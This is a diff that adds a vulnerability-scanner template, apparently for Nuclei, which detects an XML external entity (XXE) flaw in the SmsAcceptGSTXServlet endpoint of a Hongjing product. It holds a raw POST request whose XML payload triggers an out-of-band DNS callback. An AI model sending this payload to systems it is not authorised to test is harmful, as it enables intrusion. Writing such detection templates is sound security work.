@@ -1,0 +1,20 @@
+id: hongjing-SmsAcceptGSTXServlet-xxe
+info:
+  name: hongjing-SmsAcceptGSTXServlet-xxe
+  author: apple
+  severity: high
+  description: 可以参考以下文章
+  reference:
+    - https://mp.weixin.qq.com/s/zvxYdwUwsMxwd5DpNi8Ezg
+  tags: tags
+http:
+  - raw:
+      - "POST /servlet/sms/SmsAcceptGSTXServlet HTTP/1.1\nHost: \nUser-Agent: python-requests/2.31.0\n\
+        Content-Length: 115\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nContent-Type:\
+        \ text/xml\n\n<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY\
+        \ sp SYSTEM \"http://{{interactsh-url}}\">]><r><a>&sp;</a ></r>"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
